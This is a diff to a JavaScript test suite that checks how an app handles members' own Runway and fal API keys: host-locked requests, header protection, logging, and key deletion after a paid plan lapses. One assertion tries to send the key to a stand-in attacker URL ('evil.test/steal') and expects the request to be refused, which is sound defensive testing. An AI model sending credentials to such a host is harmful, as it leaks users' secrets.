@@ -200,7 +200,7 @@ test('the gallery: every category, one honest status each, never a key', async (
   assert.deepEqual(g.categories.map((c) => c.id), ['money', 'store', 'email', 'calendar', 'social', 'ads', 'knowledge', 'team', 'media', 'design', 'automation', 'ai']);
   assert.equal(status(g, 'notion').status, 'legal');
   assert.equal(status(g, 'zapier').status, 'connect');
-  assert.equal(status(g, 'higgsfield').status, 'legal');
+  assert.equal(status(g, 'higgsfield').status, 'coming', 'cleared on the member\'s own account; its switch is off');
   assert.equal(status(g, 'stripe').status, 'legal');
 
   g = connectors.gallery(boss);
@@ -694,4 +694,64 @@ test('Legal K5: 30 days after a paid plan ends, every key and sign-in goes; a pa
   assert.deepEqual(seen, [boss.id], 'other owners (Studio) get the same timer');
   // Again: nothing left, nothing breaks.
   assert.equal(await lapse.sweep({ force: true, now: now + 3 * 864e5 }), 1);
+});
+
+test('Studio providers on the member\'s own account: a key in, a host-locked request() out, K5 applies', async () => {
+  process.env.CONNECTORS = 'admins';
+  process.env.CONNECTOR_RUNWAY = 'on';
+  process.env.CONNECTOR_FAL = 'on';
+  const boss = await member('builder', { email: 'boss@127.test' });
+  const RW = 'key_' + 'r'.repeat(40);
+
+  // Cleared by Legal (row 8, way 2), so a member gets it once the switch is on and the pages are live.
+  const jo = await member();
+  assert.equal(connectors.allowed(jo, 'runway'), true);
+  const page = await (await s.go('/app/hq/apps/runway', { as: boss })).text();
+  assert.match(page, /Runway works for you under your own account and its terms, including whether it trains on what you send and what your plan there lets you do with what it makes\./);
+  assert.match(page, /Powered by Runway/);
+  assert.doesNotMatch(page, /Anthropic/);
+
+  on('GET', /api\.dev\.runwayml\.com\/v1\/organization/, { creditBalance: 100 });
+  assert.equal((await connectors.connectKey(boss, 'runway', { key: RW })).ok, true);
+  assert.equal(calls[0].headers.authorization, `Bearer ${RW}`);
+  assert.doesNotMatch(JSON.stringify(db.get('hqConnections', boss.id)), new RegExp(RW));
+
+  // Through ctx.secret: a client, never the key.
+  assert.equal(needs.member('runway'), true);
+  const rw = needs.read('runway', boss, { runId: 'r1', tool: 'studio.video' });
+  assert.deepEqual(Object.keys(rw).filter((k) => k !== 'writes'), ['request']);
+  on('POST', /api\.dev\.runwayml\.com\/v1\/image_to_video/, (url, opts) => ({ id: 'task-1', sent: JSON.parse(opts.body).promptText }));
+  const job = await rw.request('/v1/image_to_video', { method: 'POST', body: { promptText: 'A sunrise' }, headers: { authorization: 'Bearer stolen' } });
+  assert.equal(job.id, 'task-1');
+  const sent = calls.find((x) => /image_to_video/.test(x.url));
+  assert.equal(sent.headers.authorization, `Bearer ${RW}`, 'a caller can\'t swap the key');
+  assert.equal(sent.headers['x-runway-version'], '2024-11-06');
+  await assert.rejects(() => rw.request('https://evil.test/steal'), /only sends your Runway key to Runway/);
+  await assert.rejects(() => rw.request('http://api.dev.runwayml.com/v1/x'), /only sends your Runway key/);
+  assert.match(log.list(boss.id, { app: 'runway' })[0].what, /Studio used your Runway account/);
+  // A finished file comes back as bytes.
+  on('GET', /dnznrvs05pmza\.cloudfront\.net\/out\.mp4/, () => 'MP4');
+  const file = await rw.request('https://dnznrvs05pmza.cloudfront.net/out.mp4', { raw: true });
+  assert.ok(Buffer.isBuffer(file.body));
+
+  // fal: its key has two parts, and inputs and outputs aren't stored there.
+  assert.match((await connectors.connectKey(boss, 'fal', { key: 'f'.repeat(30) })).error, /two parts/);
+  assert.equal((await connectors.connectKey(boss, 'fal', { key: 'abc123abc123:' + 's'.repeat(32) })).ok, true);
+  on('POST', /queue\.fal\.run/, { request_id: 'q1' });
+  await connectors.clientFor(boss, 'fal').request('/fal-ai/flux/dev', { method: 'POST', body: { prompt: 'x' } });
+  assert.equal(calls.at(-1).headers['x-fal-store-io'], '0');
+
+  // 127's own Gemini key stays a server need; the member's is google_gemini.
+  assert.equal(needs.member('gemini'), false);
+  assert.equal(needs.member('google_gemini'), true);
+  assert.equal(needs.member('instagram'), false, "127's Business Discovery token, not a member sign-in");
+
+  // K5 covers these keys like every other.
+  const lapse = require('../lib/lapse');
+  lapse._reset();
+  Object.assign(boss, { tier: 'free', pausedTier: null, canceledAt: new Date(Date.now() - 31 * 864e5).toISOString() });
+  await db.save('users', boss);
+  await lapse.sweep({ force: true });
+  assert.equal(connectors.credsOf(boss.id, 'runway'), null);
+  assert.equal(connectors.credsOf(boss.id, 'fal'), null);
 });
